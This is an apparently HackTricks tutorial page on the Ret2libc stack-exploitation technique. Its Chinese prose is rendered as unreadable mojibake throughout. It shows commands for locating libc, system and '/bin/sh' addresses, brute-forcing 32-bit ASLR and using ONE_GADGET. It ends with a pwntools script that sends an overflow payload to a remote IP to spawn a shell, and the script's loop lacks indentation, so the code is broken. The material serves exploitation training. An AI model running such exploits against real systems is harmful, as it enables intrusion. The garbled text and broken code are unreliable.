# Ret2lib

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

**Ret2Libc**çš„æœ¬è´¨æ˜¯å°†æ˜“å—æ”»å‡»çš„ç¨‹åºçš„æ‰§è¡Œæµé‡å®šå‘åˆ°å…±äº«åº“ä¸­çš„å‡½æ•°ï¼ˆä¾‹å¦‚**system**ã€**execve**ã€**strcpy**ï¼‰ï¼Œè€Œä¸æ˜¯åœ¨å †æ ˆä¸Šæ‰§è¡Œæ”»å‡»è€…æä¾›çš„shellcodeã€‚æ”»å‡»è€…æ„é€ ä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œä¿®æ”¹å †æ ˆä¸Šçš„è¿”å›åœ°å€ï¼Œä½¿å…¶æŒ‡å‘æ‰€éœ€çš„åº“å‡½æ•°ï¼ŒåŒæ—¶æ ¹æ®è°ƒç”¨çº¦å®šè®¾ç½®ä»»ä½•å¿…è¦çš„å‚æ•°ã€‚

### **ç¤ºä¾‹æ­¥éª¤ï¼ˆç®€åŒ–ï¼‰**

* è·å–è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ï¼ˆä¾‹å¦‚systemï¼‰å’Œè¦è°ƒç”¨çš„å‘½ä»¤ï¼ˆä¾‹å¦‚/bin/shï¼‰
* ç”ŸæˆROPé“¾ä»¥ä¼ é€’æŒ‡å‘å‘½ä»¤å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå‚æ•°å’Œæ‰§è¡Œæµåˆ°å‡½æ•°

## æŸ¥æ‰¾åœ°å€

* å‡è®¾ä½¿ç”¨çš„`libc`æ˜¯å½“å‰æœºå™¨ä¸Šçš„ä¸€ä¸ªï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å®ƒå°†åŠ è½½åˆ°å†…å­˜ä¸­çš„ä½ç½®ï¼š 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

å¦‚æœæ‚¨æƒ³æ£€æŸ¥ASLRæ˜¯å¦æ­£åœ¨æ›´æ”¹libcçš„åœ°å€ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* çŸ¥é“ä½¿ç”¨çš„libcåï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ‰¾åˆ°`system`å‡½æ•°çš„åç§»é‡ï¼š
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* çŸ¥é“æ‰€ä½¿ç”¨çš„libcåï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ‰¾åˆ°å­—ç¬¦ä¸² `/bin/sh` å‡½æ•°çš„åç§»é‡ï¼š
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### ä½¿ç”¨ gdb-peda / GEF

äº†è§£ä½¿ç”¨çš„ libc åï¼Œè¿˜å¯ä»¥ä½¿ç”¨ Peda æˆ– GEF æ¥è·å– **system** å‡½æ•°çš„åœ°å€ï¼Œ**exit** å‡½æ•°çš„åœ°å€ä»¥åŠå­—ç¬¦ä¸² **`/bin/sh`** çš„åœ°å€ï¼š
```
p system
p exit
find "/bin/sh"
```
### ä½¿ç”¨ /proc/\<PID>/maps

å¦‚æœè¿›ç¨‹æ¯æ¬¡ä¸å…¶é€šä¿¡æ—¶éƒ½ä¼šåˆ›å»º**å­è¿›ç¨‹**ï¼ˆç½‘ç»œæœåŠ¡å™¨ï¼‰ï¼Œå°è¯•**è¯»å–**è¯¥æ–‡ä»¶ï¼ˆå¯èƒ½éœ€è¦ä½¿ç”¨ root æƒé™ï¼‰ã€‚

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è¿›ç¨‹å†…**libc åŠ è½½çš„ç¡®åˆ‡ä½ç½®**ï¼Œä»¥åŠæ¯ä¸ªè¿›ç¨‹çš„å­è¿›ç¨‹å°†è¦åŠ è½½çš„ä½ç½®ã€‚

![](<../../../../.gitbook/assets/image (95).png>)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒåŠ è½½åœ¨**0xb75dc000**ï¼ˆè¿™å°†æ˜¯ libc çš„åŸºåœ°å€ï¼‰

## æœªçŸ¥çš„ libc

å¯èƒ½æ‚¨**ä¸çŸ¥é“äºŒè¿›åˆ¶æ–‡ä»¶æ­£åœ¨åŠ è½½çš„ libc**ï¼ˆå› ä¸ºå®ƒå¯èƒ½ä½äºæ‚¨æ— æ³•è®¿é—®çš„æœåŠ¡å™¨ä¸Šï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨æ¼æ´æ¥**æ³„æ¼ä¸€äº›åœ°å€å¹¶æ‰¾åˆ°ä½¿ç”¨çš„ libc** åº“ï¼š

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ç”¨äºæ­¤ç›®çš„çš„ pwntools æ¨¡æ¿ï¼š

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## ç»•è¿‡ 32 ä½ ASLR

è¿™äº›æš´åŠ›æ”»å‡»**ä»…é€‚ç”¨äº 32 ä½ç³»ç»Ÿ**ã€‚

* å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ libc çš„åŸºåœ°å€ï¼ˆé€‚ç”¨äº 32 ä½ç³»ç»Ÿï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* å½“æ”»å‡»è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼Œæ‚¨å¯ä»¥å°è¯•**æš´åŠ›ç ´è§£`libc`å‡½æ•°`usleep`çš„åœ°å€**ï¼Œå°†10ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å¦‚æœæŸä¸ªæ—¶åˆ»**æœåŠ¡å™¨éœ€è¦é¢å¤–10ç§’æ‰èƒ½å“åº”**ï¼Œåˆ™æ‰¾åˆ°äº†è¯¥å‡½æ•°çš„åœ°å€ã€‚

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)å…è®¸æ‚¨è·å¾—ä¸€ä¸ªshellï¼Œè€Œä¸æ˜¯ä½¿ç”¨**system**å’Œ**"/bin/sh"**ã€‚**ONE\_GADGET**å°†åœ¨libcåº“ä¸­æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œåªéœ€ä¸€ä¸ª**ROPåœ°å€**å³å¯è·å¾—shellã€‚\
ç„¶è€Œï¼Œé€šå¸¸å­˜åœ¨ä¸€äº›çº¦æŸæ¡ä»¶ï¼Œæœ€å¸¸è§ä¸”æ˜“äºé¿å…çš„æ˜¯`[rsp+0x30] == NULL`ã€‚ç”±äºæ‚¨æ§åˆ¶**RSP**ä¸­çš„å€¼ï¼Œå› æ­¤åªéœ€å‘é€æ›´å¤šçš„NULLå€¼å³å¯é¿å…è¿™ç§çº¦æŸã€‚

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## x86 Ret2lib ä»£ç ç¤ºä¾‹

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼ŒASLR brute-force è¢«é›†æˆåœ¨ä»£ç ä¸­ï¼Œå¹¶ä¸”æ˜“å—æ”»å‡»çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½äºè¿œç¨‹æœåŠ¡å™¨ä¸Šï¼š
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib ä»£ç ç¤ºä¾‹

æŸ¥çœ‹ç¤ºä¾‹ï¼š

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (æˆ– puts)

è¿™å…è®¸é€šè¿‡è°ƒç”¨å¸¦æœ‰ç‰¹å®šæ•°æ®ä½œä¸ºå‚æ•°çš„ `printf`/`puts` æ¥**ä»è¿›ç¨‹ä¸­æ³„æ¼ä¿¡æ¯**ã€‚

## Ret2printf

è¿™åŸºæœ¬ä¸Šæ„å‘³ç€æ»¥ç”¨ **Ret2lib å°†å…¶è½¬æ¢ä¸º `printf` æ ¼å¼å­—ç¬¦ä¸²æ¼æ´**ï¼Œé€šè¿‡ä½¿ç”¨ `ret2lib` è°ƒç”¨ printf æ¥åˆ©ç”¨å…¶ä¸­çš„å€¼ï¼ˆå¬èµ·æ¥æ¯«æ— æ„ä¹‰ï¼Œä½†æ˜¯å¯èƒ½ï¼‰ï¼š

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
